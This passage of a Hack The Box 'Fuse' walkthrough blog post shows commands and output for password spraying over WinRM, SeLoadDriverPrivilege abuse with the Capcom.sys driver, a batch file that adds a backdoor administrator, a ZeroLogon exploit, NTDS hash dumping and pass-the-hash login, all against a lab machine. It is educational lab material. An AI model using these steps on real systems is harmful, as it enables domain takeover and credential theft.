+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Great ! So we have two users using this password. Rather than jumping to enumerating SMB shares of these users let’s check if any of the user is allowed to connect remotely using <code class="language-plaintext highlighter-rouge">WinRM</code></p>
+
+<p>Again using crackmapexec we can check it:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+</pre></td> --><td class="rouge-code"><pre>cfx:  ~/Documents/htb/fuse
+→ cme winrm 10.10.10.193 <span class="nt">-u</span> rpc_users.txt <span class="nt">-p</span> <span class="s1">'$fab@s3Rv1ce$1'</span> <span class="nt">--continue-on-success</span>
+WINRM       10.10.10.193    5985   FUSE             <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 14393 <span class="o">(</span>name:FUSE<span class="o">)</span> <span class="o">(</span>domain:fabricorp.local<span class="o">)</span>
+WINRM       10.10.10.193    5985   FUSE             <span class="o">[</span><span class="k">*</span><span class="o">]</span> http://10.10.10.193:5985/wsman
+WINRM       10.10.10.193    5985   FUSE             <span class="o">[</span>-] fabricorp.local<span class="se">\A</span>dministrator:<span class="nv">$fab</span>@s3Rv1ce<span class="nv">$1</span>
+WINRM       10.10.10.193    5985   FUSE             <span class="o">[</span>-] fabricorp.local<span class="se">\G</span>uest:<span class="nv">$fab</span>@s3Rv1ce<span class="nv">$1</span>
+WINRM       10.10.10.193    5985   FUSE             <span class="o">[</span>-] fabricorp.local<span class="se">\k</span>rbtgt:<span class="nv">$fab</span>@s3Rv1ce<span class="nv">$1</span>
+WINRM       10.10.10.193    5985   FUSE             <span class="o">[</span>-] fabricorp.local<span class="se">\D</span>efaultAccount:<span class="nv">$fab</span>@s3Rv1ce<span class="nv">$1</span>
+WINRM       10.10.10.193    5985   FUSE             <span class="o">[</span>+] fabricorp.local<span class="se">\s</span>vc-print:<span class="nv">$fab</span>@s3Rv1ce<span class="nv">$1</span> <span class="o">(</span>Pwn3d!<span class="o">)</span>
+WINRM       10.10.10.193    5985   FUSE             <span class="o">[</span>-] fabricorp.local<span class="se">\b</span>nielson:<span class="nv">$fab</span>@s3Rv1ce<span class="nv">$1</span>
+WINRM       10.10.10.193    5985   FUSE             <span class="o">[</span>-] fabricorp.local<span class="se">\s</span>thompson:<span class="nv">$fab</span>@s3Rv1ce<span class="nv">$1</span>
+WINRM       10.10.10.193    5985   FUSE             <span class="o">[</span>-] fabricorp.local<span class="se">\t</span>lavel:<span class="nv">$fab</span>@s3Rv1ce<span class="nv">$1</span>
+WINRM       10.10.10.193    5985   FUSE             <span class="o">[</span>-] fabricorp.local<span class="se">\p</span>merton:<span class="nv">$fab</span>@s3Rv1ce<span class="nv">$1</span>
+WINRM       10.10.10.193    5985   FUSE             <span class="o">[</span>-] fabricorp.local<span class="se">\s</span>vc-scan:<span class="nv">$fab</span>@s3Rv1ce<span class="nv">$1</span>
+WINRM       10.10.10.193    5985   FUSE             <span class="o">[</span>-] fabricorp.local<span class="se">\b</span>hult:<span class="nv">$fab</span>@s3Rv1ce<span class="nv">$1</span>
+WINRM       10.10.10.193    5985   FUSE             <span class="o">[</span>-] fabricorp.local<span class="se">\d</span>andrews:<span class="nv">$fab</span>@s3Rv1ce<span class="nv">$1</span>
+WINRM       10.10.10.193    5985   FUSE             <span class="o">[</span>-] fabricorp.local<span class="se">\m</span>berbatov:<span class="nv">$fab</span>@s3Rv1ce<span class="nv">$1</span>
+WINRM       10.10.10.193    5985   FUSE             <span class="o">[</span>-] fabricorp.local<span class="se">\a</span>stein:<span class="nv">$fab</span>@s3Rv1ce<span class="nv">$1</span>
+WINRM       10.10.10.193    5985   FUSE             <span class="o">[</span>-] fabricorp.local<span class="se">\d</span>muir:<span class="nv">$fab</span>@s3Rv1ce<span class="nv">$1</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h3 id="winrm-shell">WinRM Shell</h3>
+
+<p>We can get a WinRM shell using <a href="https://github.com/Hackplayers/evil-winrm"><strong>Evil-WinRM</strong></a> with <code class="language-plaintext highlighter-rouge">svc-print:$fab@s3Rv1ce$1</code> :</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre></td> --><td class="rouge-code"><pre>cfx:  ~/Documents/htb/fuse
+→ evil-winrm <span class="nt">-i</span> 10.10.10.193 <span class="nt">-u</span> svc-print <span class="nt">-p</span> <span class="s1">'$fab@s3Rv1ce$1'</span>
+
+Evil-WinRM shell v2.3
+
+Info: Establishing connection to remote endpoint
+
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-print<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
+</span>fabricorp<span class="se">\s</span>vc-print
+</pre></td></tr></tbody></table></code></pre></div></div>
+<h4 id="usertxt">user.txt</h4>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td> --><td class="rouge-code"><pre><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-print<span class="se">\D</span>esktop&gt; get-content user.txt
+dc9ab9df5c97cdd<span class="k">*****************</span>
+
+</pre></td></tr></tbody></table></code></pre></div></div>
+<h2 id="elevating-priv-svc-print---administrator">Elevating Priv: svc-print -&gt; Administrator</h2>
+
+<p>Going through the privileges, we can see <code class="language-plaintext highlighter-rouge">SeLoadDriverPrivilege</code> is enabled, which is quite interesting:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+</pre></td> --><td class="rouge-code"><pre><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-print<span class="se">\D</span>esktop&gt; <span class="nb">whoami</span> /priv
+
+PRIVILEGES INFORMATION
+<span class="nt">----------------------</span>
+
+Privilege Name                Description                    State
+<span class="o">=============================</span> <span class="o">==============================</span> <span class="o">=======</span>
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeLoadDriverPrivilege         Load and unload device drivers Enabled
+SeShutdownPrivilege           Shut down the system           Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working <span class="nb">set </span>Enabled
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>It appears <code class="language-plaintext highlighter-rouge">SeLoadDriverPrivilege</code> is enabled because the user <code class="language-plaintext highlighter-rouge">svc-print</code> is a member of <code class="language-plaintext highlighter-rouge">Print Operators</code> and is quite dangerous as it allows user to load kernel drivers leading to code execution with SYSTEM privileges.</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+</pre></td> --><td class="rouge-code"><pre><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-print<span class="se">\D</span>esktop&gt; net user svc-print
+User name                    svc-print
+Full Name
+Comment
+User<span class="s1">'s comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            5/30/2020 4:27:08 PM
+Password expires             Never
+Password changeable          5/31/2020 4:27:08 PM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   11/1/2020 2:34:00 AM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Print Operators
+Global Group memberships     *Domain Users         *IT_Accounts
+The command completed successfully.
+
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+<h3 id="attack-scenario">Attack Scenario</h3>
+
+<p>A quick Google search on <code class="language-plaintext highlighter-rouge">SeLoadDriverPrivilege</code> leads us to this <a href="https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/"><strong>blog post</strong></a> from Tarlogic which explains quite neatly on how to abuse this Privilege.</p>
+
+<ul>
+  <li>
+    <p>Compile the driver loader tool available here : <a href="https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp">https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp</a></p>
+  </li>
+  <li>
+    <p>Load the Vulnerable Capcom Signed driver from FuzzySecurity available here : <a href="https://github.com/FuzzySecurity/PSKernel-Primitives/blob/master/Sample-Exploits/Capcom/Capcom.sys">https://github.com/FuzzySecurity/PSKernel-Primitives/blob/master/Sample-Exploits/Capcom/Capcom.sys</a></p>
+  </li>
+  <li>
+    <p>Modify &amp; Compile Capcom Exploit with which exploits vulnerable <code class="language-plaintext highlighter-rouge">capcom.sys</code> : <a href="https://github.com/tandasat/ExploitCapcom">https://github.com/tandasat/ExploitCapcom</a></p>
+  </li>
+</ul>
+
+<p>We’ll compile all the files inside a Windows VM using Visual Studio Community.</p>
+
+<h3 id="step-1-load-driver">Step 1: Load Driver</h3>
+
+<p>For loading <code class="language-plaintext highlighter-rouge">capcom.sys</code> we’ll need driver loader tool, code is available <a href="https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp"><strong>here</strong></a> we just need to compile it as it is without any modifications.</p>
+
+<p>First, We need to install Visual Studio with <code class="language-plaintext highlighter-rouge">Desktop Development for C++</code> option, once installed we’ll create a new project in Visual Studio selecting C++ Console App:</p>
+
+<p><img src="/assets/img/Posts/Fuse/code.png" alt="code" /></p>
+
+<p>On next windows, We’ll name it as <code class="language-plaintext highlighter-rouge">LoadDriverPriv</code>:</p>
+
+<p><img src="/assets/img/Posts/Fuse/code1.png" alt="code1" /></p>
+
+<p>Now We’ll have a sample <strong>Hello World</strong> code inside the project which we need to replace with <a href="https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp"><strong>driver code</strong></a> and save it, We’ll see a error regarding <code class="language-plaintext highlighter-rouge">include "stdafx.h"</code> but we can just remove the line and move ahead.</p>
+
+<p>By default the project build would be set to <code class="language-plaintext highlighter-rouge">debug</code> we’ll set it to <code class="language-plaintext highlighter-rouge">Release and x64</code> :</p>
+
+<p><img src="/assets/img/Posts/Fuse/code2.png" alt="code2" /></p>
+
+<p>Then select Build -&gt; Build Solution, on successful build we should see the following output:</p>
+
+<p><img src="/assets/img/Posts/Fuse/code3.png" alt="code3" /></p>
+
+<p>Successfully compiled! We’ll copy the generated <code class="language-plaintext highlighter-rouge">LoadDriverPriv.exe</code> to our kali machine.</p>
+
+<h3 id="step-2-capcomsys-driver">Step 2: Capcom.sys driver</h3>
+
+<p>We’ll just download Vulnerable Capcom Signed driver available here : <a href="https://github.com/FuzzySecurity/PSKernel-Primitives/blob/master/Sample-Exploits/Capcom/Capcom.sys">https://github.com/FuzzySecurity/PSKernel-Primitives/blob/master/Sample-Exploits/Capcom/Capcom.sys</a> and save it our kali machine.</p>
+
+<h3 id="step-3-exploitcapcom">Step 3: ExploitCapcom</h3>
+
+<p>We’ll start by downloading this <a href="https://github.com/tandasat/ExploitCapcom"><strong>project</strong></a> from tandasat which is a standalone exploit to exploit vulnerable Capcom.sys. This is actually Full Visual studio project, we’ll clone the repo on our machine.</p>
+
+<p>Inside ExploitCapcom folder, there a <code class="language-plaintext highlighter-rouge">ExploitCapcom.sln</code> which is a visual studio solution file. To open the <code class="language-plaintext highlighter-rouge">.sln</code> file from Visual studio itself we select File -&gt; Open -&gt; Project/Solution, Or we can just double click the <code class="language-plaintext highlighter-rouge">ExploitCapcom.sln</code> which should also open the project.</p>
+
+<p><img src="/assets/img/Posts/Fuse/code4.png" alt="code4" /></p>
+
+<h4 id="modify-code">Modify Code</h4>
+
+<p>Going through the exploit, We understand Default code is set to pop up <code class="language-plaintext highlighter-rouge">cmd.exe</code> with elevated system privileges, but that’s not possible for us since we are not running a interactive session.</p>
+
+<p>Instead we’ll change the <code class="language-plaintext highlighter-rouge">CommandLine</code> string to load <code class="language-plaintext highlighter-rouge">cfx.bat</code> a batch file located at <code class="language-plaintext highlighter-rouge">C:\Priv\cfx.bat</code></p>
+
+<p><img src="/assets/img/Posts/Fuse/code5.png" alt="code5" /></p>
+
+<p>Now after changing the code, select the dropdown to Release and x64, then select Build -&gt; Build Solution. Once completed We need to copy the <code class="language-plaintext highlighter-rouge">ExploitCapcom.exe</code> to our kali machine.</p>
+
+<h3 id="generate-payload">Generate Payload</h3>
+
+<p>We need to create <code class="language-plaintext highlighter-rouge">cfx.bat</code> and Whichever commands we input inside <code class="language-plaintext highlighter-rouge">cfx.bat</code> it will run as SYSTEM.</p>
+
+<p>So, Instead of getting a reverse shell as SYSTEM, Inside <code class="language-plaintext highlighter-rouge">cfx.bat</code> We’ll input commands to create a new user with credentials <code class="language-plaintext highlighter-rouge">coldfusion:ColdFusi0nX</code> and also add this user to Administrators Local group.</p>
+
+<h4 id="cfxbat">cfx.bat</h4>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre></td> --><td class="rouge-code"><pre>cfx:  ~/Documents/htb/fuse
+→ <span class="nb">cat </span>cfx.bat
+C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\n</span>et.exe <span class="nb">users </span>coldfusion ColdFusi0nX /add
+C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\n</span>et.exe localgroup administrators coldfusion /add
+
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>Now that we have all the files ready, we can proceed with the exploitation. You can also find the files on my <a href="https://github.com/ColdFusionX/LabScripts/tree/master/HTB/Fuse/SeLoadDriverPrivilege"><strong>repo</strong></a></p>
+
+<h3 id="exploitation">Exploitation</h3>
+
+<p>First, we will create a Directory <code class="language-plaintext highlighter-rouge">Priv</code> inside <code class="language-plaintext highlighter-rouge">C:\</code> and upload LoadDriverPriv.exe, Capcom.sys, ExploitCapcom.exe &amp; cfx.bat into it.</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+</pre></td> --><td class="rouge-code"><pre><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\&gt;</span> <span class="nb">mkdir </span>Priv
+
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\&gt;</span> <span class="nb">cd </span>Priv
+
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>riv&gt; upload LoadDriverPriv.exe
+Info: Uploading LoadDriverPriv.exe to C:<span class="se">\P</span>riv<span class="se">\L</span>oadDriverPriv.exe
+
+
+Data: 20480 bytes of 20480 bytes copied
+
+Info: Upload successful!
+
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>riv&gt; upload Capcom.sys
+Info: Uploading Capcom.sys to C:<span class="se">\P</span>riv<span class="se">\C</span>apcom.sys
+
+
+Data: 14100 bytes of 14100 bytes copied
+
+Info: Upload successful!
+
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>riv&gt; upload ExploitCapcom.exe
+Info: Uploading ExploitCapcom.exe to C:<span class="se">\P</span>riv<span class="se">\E</span>xploitCapcom.exe
+
+
+Data: 363176 bytes of 363176 bytes copied
+
+Info: Upload successful!
+
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>riv&gt; upload cfx.bat
+Info: Uploading cfx.bat to C:<span class="se">\P</span>riv<span class="se">\c</span>fx.bat
+
+
+Data: 176 bytes of 176 bytes copied
+
+Info: Upload successful!
+
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>riv&gt; <span class="nb">ls
+
+
+    </span>Directory: C:<span class="se">\P</span>riv
+
+
+Mode                LastWriteTime         Length Name
+<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
+<span class="nt">-a----</span>        11/1/2020  10:31 AM          10576 Capcom.sys
+<span class="nt">-a----</span>        11/1/2020  10:32 AM            132 cfx.bat
+<span class="nt">-a----</span>        11/1/2020  10:32 AM         272384 ExploitCapcom.exe
+<span class="nt">-a----</span>        11/1/2020  10:30 AM          15360 LoadDriverPriv.exe
+
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Now we will first load the <code class="language-plaintext highlighter-rouge">Capcom.sys</code> driver using <code class="language-plaintext highlighter-rouge">LoadDriverPriv.exe</code> as explained in the blog:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre></td> --><td class="rouge-code"><pre><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>riv&gt; .<span class="se">\L</span>oadDriverPriv.exe System<span class="se">\C</span>urrentControlSet<span class="se">\c</span>fxservice C:<span class="se">\P</span>riv<span class="se">\C</span>apcom.sys
+<span class="o">[</span>+] Enabling SeLoadDriverPrivilege
+<span class="o">[</span>+] SeLoadDriverPrivilege Enabled
+<span class="o">[</span>+] Loading Driver: <span class="se">\R</span>egistry<span class="se">\U</span>ser<span class="se">\S</span><span class="nt">-1-5-21-2633719317-1471316042-3957863514-1104</span><span class="se">\S</span>ystem<span class="se">\C</span>urrentControlSet<span class="se">\c</span>fxservice
+NTSTATUS: 00000000, WinError: 0
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>Great! It’s loaded without error.</p>
+
+<p>Now we just need to execute <code class="language-plaintext highlighter-rouge">ExploitCapcom.exe</code></p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre></td> --><td class="rouge-code"><pre><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>riv&gt; .<span class="se">\E</span>xploitCapcom.exe
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Capcom.sys exploit
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Capcom.sys handle was obtained as 0000000000000080
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Shellcode was placed at 000001E807BA0008
+<span class="o">[</span>+] Shellcode was executed
+<span class="o">[</span>+] Token stealing was successful
+<span class="o">[</span>+] The SYSTEM shell was launched
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Press any key to <span class="nb">exit </span>this program
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>Exploit ran without any issues, we can now check and confirm that our user was created successfully.</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+</pre></td> --><td class="rouge-code"><pre><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>riv&gt; net user coldfusion
+User name                    coldfusion
+Full Name
+Comment
+User<span class="s1">'s comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            11/2/2020 10:38:01 AM
+Password expires             12/14/2020 10:38:01 AM
+Password changeable          11/3/2020 10:38:01 AM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   Never
+
+Logon hours allowed          All
+
+Local Group Memberships      *Administrators
+Global Group memberships     *Domain Users
+The command completed successfully.
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<h3 id="local-administrator---coldfusion">Local Administrator - coldfusion</h3>
+
+<p>Now that our user was successfully created, We can get a shell using <code class="language-plaintext highlighter-rouge">coldfusion:ColdFusi0nX</code>:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre></td> --><td class="rouge-code"><pre>cfx:  ~/Documents/htb/fuse
+→  evil-winrm <span class="nt">-i</span> 10.10.10.193 <span class="nt">-u</span> coldfusion <span class="nt">-p</span> ColdFusi0nX
+
+Evil-WinRM shell v2.3
+
+Info: Establishing connection to remote endpoint
+
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\c</span>oldfusion<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
+</span>fabricorp<span class="se">\c</span>oldfusion
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>Since we are a member of Local Administrators group, we are authorized to read <code class="language-plaintext highlighter-rouge">root.txt</code> from Administrator’s Desktop:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td> --><td class="rouge-code"><pre><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\c</span>oldfusion<span class="se">\D</span>ocuments&gt; <span class="nb">cd</span> ../../Administrator/Desktop
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt; get-content root.txt
+562d41d17cbbea2<span class="k">*****************</span>
+
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h3 id="administrator-shell">Administrator Shell</h3>
+
+<p>We can also set Administrator’s password as <code class="language-plaintext highlighter-rouge">ColdFus1onx</code>:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td> --><td class="rouge-code"><pre><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\c</span>oldfusion<span class="se">\D</span>ocuments&gt; net <span class="nb">users </span>administrator ColdFus1onx
+The <span class="nb">command </span>completed successfully
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>Now let’s get a new shell as Administrator:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+</pre></td> --><td class="rouge-code"><pre>cfx:  ~/Documents/htb/fuse
+→ evil-winrm <span class="nt">-i</span> 10.10.10.193 <span class="nt">-u</span> administrator <span class="nt">-p</span> <span class="s1">'ColdFus1onx'</span>
+
+Evil-WinRM shell v2.3
+
+Info: Establishing connection to remote endpoint
+
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
+</span>fabricorp<span class="se">\a</span>dministrator
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt; get-content root.txt
+562d41d17cbbea2<span class="k">*****************</span>
+
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h2 id="unintented-method">Unintented Method</h2>
+
+<h3 id="exploiting-zerologon-cve-2020-1472">Exploiting ZeroLogon (CVE-2020-1472)</h3>
+
+<p>I am not fond of this method as it totally eliminates all the hard work &amp; efforts, directly leading you to Admin shell.</p>
+
+<p>Even though it’s not that fun, But the Fact that this was an old Windows Machine released prior to ZeroLogon it is likely to be Vulnerable.</p>
+
+<blockquote>
+  <p>Zerologon is the name that has been given to a vulnerability identified in CVE-2020-1472. It’s called zerologon due to the flaw in the logon process where the initialization vector (IV) is set to all zeros all the time while an Initialization Vector (IV) should always be a random number. Allows to instantly become domain admin by subverting Netlogon cryptography.</p>
+</blockquote>
+
+<p>We’ll exploit it with reference to <a href="https://github.com/dirkjanm/CVE-2020-1472"><strong>this PoC</strong></a>:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre></td> --><td class="rouge-code"><pre>cfx:  /opt/CVE-2020-1472  |master ✓|
+→ python3 cve-2020-1472-exploit.py FUSE 10.10.10.193
+Performing authentication attempts...
+<span class="o">===============================================================================================</span>
+Target vulnerable, changing account password to empty string
+
+Result: 0
+
+Exploit <span class="nb">complete</span><span class="o">!</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>Now that the exploit has completed successfully, Let’s use Impacket’s <code class="language-plaintext highlighter-rouge">secretsdump.py</code> to extract NTDS.DIT data (NTLM hashes and Kerberos keys)</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+</pre></td> --><td class="rouge-code"><pre>cfx:  /opt/CVE-2020-1472  |master ✓|
+→ secretsdump.py <span class="nt">-no-pass</span> <span class="nt">-just-dc</span> fabricorp.local/FUSE<span class="se">\$</span>@10.10.10.193
+Impacket v0.9.22.dev1+20201015.130615.81eec85a - Copyright 2020 SecureAuth Corporation
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Dumping Domain Credentials <span class="o">(</span>domain<span class="se">\u</span><span class="nb">id</span>:rid:lmhash:nthash<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:370ddcf45959b2293427baa70376e14e:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:8ee7fac1bd38751dbff06b33616b87b0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+svc-print:1104:aad3b435b51404eeaad3b435b51404ee:38485fd7730cca53473d0fa6ed27aa71:::
+bnielson:1105:aad3b435b51404eeaad3b435b51404ee:8873f0c964ab36700983049e2edd0f77:::
+sthompson:1601:aad3b435b51404eeaad3b435b51404ee:5fb3cc8b2f45791e200d740725fdf8fd:::
+<span class="o">[</span>..SNIP..]
+</pre></td></tr></tbody></table></code></pre></div></div>
+<h3 id="admin-shell">Admin Shell</h3>
+
+<p>Using Administrator NT hash, we can get a shell:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre></td> --><td class="rouge-code"><pre>cfx:  ~/Documents/htb/fuse
+→ evil-winrm <span class="nt">-i</span> 10.10.10.193 <span class="nt">-u</span> Administrator <span class="nt">-H</span> <span class="s1">'370ddcf45959b2293427baa70376e14e'</span>
+
+Evil-WinRM shell v2.3
+
+Info: Establishing connection to remote endpoint
+
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
+</span>fabricorp<span class="se">\a</span>dministrator
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt; get-content root.txt
+562d41d17cbbea2<span class="k">*****************</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>And we pwned the Box !</p>
+
+<p>Thanks for reading, Suggestions &amp; Feedback are appreciated !</p>
+:ET
